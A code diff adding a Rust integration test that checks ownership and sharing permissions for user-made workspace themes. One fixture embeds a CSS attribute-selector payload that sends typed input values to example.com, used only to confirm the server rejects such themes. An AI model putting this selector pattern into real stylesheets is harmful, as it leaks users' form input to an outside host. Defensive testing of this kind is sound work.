@@ -2169,3 +2169,128 @@ async fn only_an_account_and_its_managers_touch_its_connections() {
     assert!(body.to_string().contains(&connection.to_string()), "{body}");
     world.finish().await;
 }
+
+/// Themes: someone's own theme is theirs alone until the workspace offers
+/// it. Another member never reads, changes or deletes it; only a holder of
+/// the settings permission offers one; and an offered theme is still only
+/// its maker's to change.
+#[tokio::test]
+async fn themes_are_their_makers_until_offered() {
+    let Some(world) = super::support::world::WorldBuilder::default()
+        .project("WORK")
+        .person("lena", "member")
+        .agent("rook", "member")
+        .build("privacy_themes")
+        .await
+    else {
+        return;
+    };
+    let op = |name: &str| format!("/api/v2/w/{}/ops/{name}", world.organization);
+    let owner = &world.owner.browser;
+    let lena = &world.people["lena"].browser;
+    let document = json!({
+        "format": 1,
+        "light": {"base": "quiet", "tokens": {"accent": "#224466"}},
+        "dark": {"base": "quiet-dark", "tokens": {}},
+    });
+    let (status, made) = send(
+        &world.app,
+        owner.request(
+            "POST",
+            &op("theme_create"),
+            Some("t-1"),
+            json!({ "name": "Owner's own", "document": document }),
+        ),
+    )
+    .await;
+    assert_eq!(made["outcome"], "ok", "{status} {made}");
+    let theme = made["value"]["id"].as_str().expect("theme id").to_owned();
+
+    // Before it's offered, Lena can't see it, change it or offer it.
+    let refused = |name: &'static str, key: &'static str, body: Value| {
+        let request = lena.request("POST", &op(name), Some(key), body);
+        let app = world.app.clone();
+        async move {
+            let (status, body) = send(&app, request).await;
+            assert_ne!(body["outcome"], "ok", "{name}: {status} {body}");
+        }
+    };
+    refused("theme_get", "l-1", json!({ "id": theme })).await;
+    refused(
+        "theme_update",
+        "l-2",
+        json!({ "id": theme, "expectedVersion": 1, "name": "Mine now" }),
+    )
+    .await;
+    refused("theme_delete", "l-3", json!({ "id": theme })).await;
+    refused(
+        "workspace_theme_set",
+        "l-4",
+        json!({ "themeId": theme, "offered": true }),
+    )
+    .await;
+    let (_, listed) = send(
+        &world.app,
+        lena.request("POST", &op("theme_list"), None, json!({})),
+    )
+    .await;
+    assert!(!listed.to_string().contains(&theme), "{listed}");
+
+    // A theme that loads from elsewhere is refused for anyone.
+    let (_, leaky) = send(
+        &world.app,
+        owner.request(
+            "POST",
+            &op("theme_create"),
+            Some("t-2"),
+            json!({ "name": "Leaky", "document": {
+                "format": 1,
+                "light": {"base": "quiet", "tokens": {}},
+                "dark": {"base": "quiet-dark", "tokens": {}},
+                "css": "input[value^='a'] { background: url(https://example.com/a); }",
+            }}),
+        ),
+    )
+    .await;
+    assert_ne!(leaky["outcome"], "ok", "{leaky}");
+
+    // Offered, Lena reads it and lists it, but it stays the owner's to change.
+    let (_, offered) = send(
+        &world.app,
+        owner.request(
+            "POST",
+            &op("workspace_theme_set"),
+            Some("t-3"),
+            json!({ "themeId": theme, "offered": true }),
+        ),
+    )
+    .await;
+    assert_eq!(offered["outcome"], "ok", "{offered}");
+    let (_, read) = send(
+        &world.app,
+        lena.request("POST", &op("theme_get"), None, json!({ "id": theme })),
+    )
+    .await;
+    assert_eq!(read["outcome"], "ok", "{read}");
+    assert_eq!(read["value"]["mine"], false, "{read}");
+    refused(
+        "theme_update",
+        "l-5",
+        json!({ "id": theme, "expectedVersion": 2, "name": "Mine now" }),
+    )
+    .await;
+    refused("theme_delete", "l-6", json!({ "id": theme })).await;
+    refused(
+        "workspace_theme_set",
+        "l-7",
+        json!({ "themeId": theme, "offered": false }),
+    )
+    .await;
+    let name = sqlx::query_scalar::<_, String>("SELECT name FROM themes WHERE id = $1::uuid")
+        .bind(&theme)
+        .fetch_one(world.pool())
+        .await
+        .expect("theme");
+    assert_eq!(name, "Owner's own");
+    world.finish().await;
+}
